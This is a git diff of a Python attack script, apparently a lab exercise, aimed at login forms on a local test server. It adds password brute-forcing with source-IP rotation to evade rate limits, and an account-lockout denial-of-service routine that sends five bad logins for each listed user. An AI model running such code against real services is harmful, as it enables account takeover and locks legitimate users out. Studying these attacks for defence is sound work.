@@ -82,8 +82,8 @@ class Attack():
 	# attack login form #2
 	def form_2(self, index=0):
 		
-		# end of proxy ranges
-		ranges = ['10.0.0.254', '172.16.1.254', '172.16.2.254']
+		# once ip range ends, change virtual ip address range to next in list
+		ranges = [ip for ip in self.proxies if ip.endswith('.254')]
 		range_reached = False
   
 		# rotate proxies
@@ -93,10 +93,10 @@ class Attack():
 				password = self.passwords[index] 
 				data = f'username={self.username}&password={password}'
     
-				# bind proxy address, skip if range changed
+				# bind proxy address, skip if range changed (last ip in range)
 				socket = http.client.HTTPConnection('localhost', 5000, source_address=(proxy, 0))
 				if range_reached:
-					continue
+					continue 
      
 				# send login request
 				socket.request('POST', '/login_2', body=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
@@ -132,7 +132,7 @@ class Attack():
 			time.sleep(75)
 			self.form_2(index)
 
-  
+   
 	# attack login form #3
 	def form_3(self):
 		# get captcha end points
@@ -185,11 +185,38 @@ class Attack():
  
 				index += 1
 	
-     
+ 
 	# attack login form #4
 	def form_4(self):
-		pass
-
+		'''
+			denial-of-service attack, since the attacker can't access 
+   			the admin account, the attacker's goal now is to lock the 
+      		accounts of all users of the web application
+		'''
+  
+		# lockout all users on application
+		self.users = [
+			self.username,
+			'sarah@secure.com',
+			'reece@secure.com',
+			'anthony@secure.com',
+		]
+  
+		# try each password until success status
+		for user in self.users:
+			data = {
+				'username': user,
+				'password': 'password',
+			}
+   
+			# send garbage password attempt 5 times in order to lock account
+			for _ in range(5):
+				requests.post(self.url, data=data)
+				c = '[' + colored(f'Attacking', 'blue') + ']'
+				print(f'\n{c} : user {user}')
+    
+			c = '[' + colored(f' Locked  ', 'magenta', attrs=['bold', 'blink']) + ']'
+			print(f'\n{c} : user {user}')
 
 
 # start
